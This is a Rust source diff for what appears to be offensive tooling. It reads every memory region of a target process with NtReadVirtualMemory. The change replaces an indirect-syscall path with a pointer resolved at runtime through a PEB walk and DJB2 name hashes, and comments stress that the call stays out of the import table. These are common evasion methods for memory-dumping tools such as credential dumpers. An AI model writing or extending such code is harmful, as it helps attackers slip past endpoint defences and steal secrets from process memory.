@@ -9,7 +9,6 @@
 
 use crate::crypto;
 use crate::resolver::{self, ApiResolver};
-use crate::syscall;
 use windows::Win32::Foundation::*;
 use windows::Win32::System::Memory::*;
 use windows::Win32::System::SystemInformation::*;
@@ -259,9 +258,15 @@ fn read_memory_regions(api: &ApiResolver, process: HANDLE) -> Result<Vec<MemRegi
     let mut regions = Vec::new();
     let mut address: u64 = 0;
 
-    // Resolve NtReadVirtualMemory SSN for indirect syscall
-    let nrvm_entry = syscall::resolve_ssn(api, resolver::HASH_NT_READ_VIRTUAL_MEMORY)
-        .ok_or("Failed to resolve NtReadVirtualMemory SSN")?;
+    // Dynamically resolve NtReadVirtualMemory from ntdll (not in IAT)
+    type FnNtReadVirtualMemory =
+        unsafe extern "system" fn(isize, *const u8, *mut u8, usize, *mut usize) -> i32;
+    let nt_read: FnNtReadVirtualMemory = unsafe {
+        std::mem::transmute(
+            api.ntdll(resolver::HASH_NT_READ_VIRTUAL_MEMORY)
+                .ok_or("Failed to resolve NtReadVirtualMemory")?,
+        )
+    };
 
     unsafe {
         loop {
@@ -292,24 +297,15 @@ fn read_memory_regions(api: &ApiResolver, process: HANDLE) -> Result<Vec<MemRegi
                 let mut buffer = vec![0u8; region_size];
 
                 let mut bytes_read = 0usize;
-                // NtReadVirtualMemory via indirect syscall
-                // NTSTATUS NtReadVirtualMemory(
-                //   HANDLE ProcessHandle,      // rcx
-                //   PVOID BaseAddress,          // rdx
-                //   PVOID Buffer,               // r8
-                //   SIZE_T NumberOfBytesToRead,  // r9
-                //   PSIZE_T NumberOfBytesRead    // [rsp+0x28]
-                // )
-                let status = unsafe {
-                    syscall::indirect_syscall5!(
-                        nrvm_entry,
-                        process.0 as u64,
-                        mbi.BaseAddress as u64,
-                        buffer.as_mut_ptr() as u64,
-                        region_size as u64,
-                        &mut bytes_read as *mut usize as u64
-                    )
-                };
+                // NtReadVirtualMemory via dynamically resolved function pointer
+                // (no IAT entry — resolved at runtime via PEB walk + DJB2)
+                let status = nt_read(
+                    process.0 as isize,
+                    mbi.BaseAddress as *const u8,
+                    buffer.as_mut_ptr(),
+                    region_size,
+                    &mut bytes_read,
+                );
 
                 if status >= 0 && bytes_read > 0 {
                     buffer.truncate(bytes_read);
